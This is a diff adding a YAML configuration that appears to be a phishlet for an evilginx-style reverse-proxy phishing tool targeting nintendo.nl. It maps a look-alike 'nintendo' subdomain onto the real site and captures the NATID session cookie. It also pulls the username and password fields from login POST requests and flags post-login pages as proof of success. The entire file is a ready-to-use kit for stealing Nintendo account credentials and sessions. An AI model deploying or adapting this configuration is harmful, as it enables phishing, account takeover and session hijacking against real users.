@@ -1,0 +1,29 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'nintendo', orig_sub: 'www', domain: 'nintendo.nl', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'nintendo.nl', orig_sub: 'www', domain: 'nintendo.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'nintendo.nl'
+    keys: ['NATID']
+
+auth_urls:
+  - '/home/news'
+  - '/home/.*'   
+
+credentials:
+  username:
+    key: 'subject_id'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'subject_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.nintendo.nl'
+  path: '/login'
